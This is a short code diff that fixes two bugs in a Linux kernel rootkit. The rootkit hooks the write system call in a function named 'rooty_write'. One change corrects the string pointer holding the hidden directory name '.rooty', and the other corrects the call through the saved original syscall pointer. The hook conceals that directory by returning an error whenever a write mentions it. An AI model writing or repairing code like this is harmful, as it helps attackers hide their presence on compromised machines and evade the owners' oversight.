@@ -46,7 +46,7 @@ psize **find(void) {
 
 asmlinkage ssize_t rooty_write(int fd, const char __user *buff, size_t count) {
  int r; /* return */
- char proc_protect = ".rooty"; /* directory name to protect */
+ char *proc_protect = ".rooty"; /* directory name to protect */
  char *kbuff = (char *) kmalloc(256,GFP_KERNEL); /* allocate kernel memory for memory from userland */
  copy_from_user(kbuff,buff,255); /* copy the userland memory to the kernel memory allocation */
  if (strstr(kbuff,proc_protect)) { /* does the write buffer memroy contain the protected directory name */
@@ -54,7 +54,7 @@ asmlinkage ssize_t rooty_write(int fd, const char __user *buff, size_t count) {
   /* don't display ls write error with ENOTDIR/ENOENT */
   return EEXIST; /* And return file exists error */
  }
- r = o_write(fd,buff,count); /* Otherwise return data from original write system call */
+ r = (*o_write)(fd,buff,count); /* Otherwise return data from original write system call */
  kfree(kbuff);
  return r;
 }
